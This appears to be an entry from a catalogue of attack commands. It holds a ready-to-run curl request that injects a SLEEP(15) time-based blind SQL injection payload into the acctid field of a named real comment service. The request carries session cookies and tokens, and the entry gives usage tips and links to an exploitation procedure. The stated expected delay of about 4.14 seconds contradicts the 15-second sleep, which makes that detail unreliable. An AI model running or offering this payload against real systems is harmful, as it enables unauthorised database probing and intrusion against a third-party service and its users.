---
id: cmd-sqli-sleep15-2024
data: >-
  curl -X GET
  "https://www.intensedebate.com/js/commentAction/?data={\"request_type\":\"0\",
  \"params\": {\"firstCall\":true, \"src\":0, \"blogpostid\":504704482,
  \"acctid\":\"251219 AND SLEEP(15)#\", \"parentid\":\"0\", \"depth\":\"0\",
  \"type\":\"1\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",
  \"anonName\":\"\", \"anonEmail\":\"X\", \"anonURL\":\"\",
  \"userid\":\"26745290\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",
  \"mblid\":\"1\", \"tweetThis\":\"F\", \"subscribeThis\":\"1\",
  \"comment\":\"w\"}}" -H "Host: www.intensedebate.com" -H "User-Agent:
  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
  -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H
  "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer:
  https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves"
  -H "Cookie: login_pref=IDC; idcomments_userid=26745290;
  idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848;
  country_code=FR; IDNewThreadComment=w"
tags:
  - sqli
  - exploit
type: command
output: HTTP response with delayed timing (~4140ms)
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.430Z'
verified: false
validated: true
submitted: true
---
# time-based-sqli-sleep-15

## Command

```bash
curl -X GET "https://www.intensedebate.com/js/commentAction/?data={\"request_type\":\"0\", \"params\": {\"firstCall\":true, \"src\":0, \"blogpostid\":504704482, \"acctid\":\"251219 AND SLEEP(15)#\", \"parentid\":\"0\", \"depth\":\"0\", \"type\":\"1\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\", \"anonName\":\"\", \"anonEmail\":\"X\", \"anonURL\":\"\", \"userid\":\"26745290\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\", \"mblid\":\"1\", \"tweetThis\":\"F\", \"subscribeThis\":\"1\", \"comment\":\"w\"}}" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves" -H "Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w"
```

## Description

This curl command sends a GET request with a JSON payload injecting a SLEEP(15) SQL payload into the acctid parameter to exploit time-based blind SQL injection on intensedebate.com. Use it to induce and measure database delays.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `data=...` | URL-encoded JSON with SQL payload | Yes |
| `-H "Host: ..."` | Target host header | Yes |
| `-H "User-Agent: ..."` | Mimics browser | Yes |
| `-H "Cookie: ..."` | Session cookies | Yes |

## Examples

### Basic Usage

```bash
curl ... (full command above)
```

### Advanced Usage

Add `-w "%{time_total}s\n"` to output timing:

```bash
curl ... -w "%{time_total}s\n"
```

## Expected Output

HTTP/1.1 200 OK response body with JSON, but total execution time around 4.14 seconds due to SLEEP(15).

## Related

- [[commands/time-based-sqli-sleep-7]]
- [[procedures/Exploit-Time-Based-SQL-Injection-in-Acctid]]
